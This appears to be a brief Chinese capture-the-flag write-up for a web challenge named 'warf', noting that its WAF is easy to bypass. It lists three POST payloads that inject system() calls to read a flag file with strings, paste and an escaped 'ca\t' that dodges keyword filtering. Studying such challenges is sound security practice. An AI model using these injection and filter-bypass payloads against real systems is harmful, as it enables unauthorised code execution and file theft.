## warf

***

出题人：Jay17

![image-20240413223206050](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413223206050.png)

开局，看似铁waf，其实漏洞百出，有很多绕过方法。

![descript](C:/Users/26272/Pictures/media/cb7652fe6132f96cf18520a56df7a019.png)

```php
POST:
code=system('strings /f*')
code=system('paste /f*')
code=system('ca\t /f*')

```

